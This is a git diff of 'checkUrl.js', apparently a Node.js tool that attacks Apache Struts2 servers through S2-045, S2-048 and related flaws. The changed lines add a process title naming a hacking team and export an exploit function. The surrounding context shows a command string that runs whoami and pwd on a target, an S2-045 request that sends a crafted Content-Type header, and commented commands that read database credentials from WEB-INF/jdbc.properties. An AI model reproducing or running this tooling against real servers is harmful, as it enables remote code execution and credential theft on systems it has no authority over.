@@ -18,7 +18,7 @@ var szMyName = 'M.T.X._2017-06-08 1.0',
 	g_szCmdW = "echo whoami: && whoami && echo pwd: && echo %cd% && echo cmdend", // && dir
 	aHS = "X-Content-Type-Options,content-type,Strict-Transport-Security,Public-Key-Pins,Content-Security-Policy,X-Permitted-Cross-Domain-Policies,Referrer-Policy,X-Content-Security-Policy,x-frame-options,X-Webkit-CSP,X-XSS-Protection,X-Download-Options".toLowerCase().split(/[,]/)
 		;
-
+process.title = '巅狼团队_M.T.X.V 2.0'
 process.stdin.setEncoding('utf8');
 process.env.NODE_ENV = "production";
 process.on('uncaughtException', function(e){console.log(e)});
@@ -516,7 +516,6 @@ function doStruts2_045(url, fnCbk)
 	// ,"echo ls:;ls;echo pwd:;pwd;echo whoami:;whoami"
 	//  && cat #curPath/WEB-INF/jdbc.propertis
 	// if(/\/$/.test(url))url = url.substr(0, url.length - 1);
-	console.log(url);
 	request(fnOptHeader({method: 'POST',uri: url
 	    ,headers:
 	    {
@@ -525,7 +524,6 @@ function doStruts2_045(url, fnCbk)
 	    	"Content-Type":g_postData
 	    }})
 	  , function (error, response, body){
-
 	  		if(body)
 	  		{
 	  			// body = String(body).replace(/cmdend.*?$/gmi, "cmdend\n");
@@ -1550,7 +1548,14 @@ if(program.test)
 	doStruts2_048("http://192.168.10.216:8082/s2-048/integration/saveGangster.action");
 	///////////*/
 }
-
+module.exports = {"doStruts2_001":doStruts2_001};
+var kk = this;
+for(var k in kk)
+{
+	if("function" == typeof kk[k])
+		console.log(k);
+	// else console.log(kk[k]);
+}
 /*
 s2-045
 node checkUrl.js http://192.168.24.67:22245/
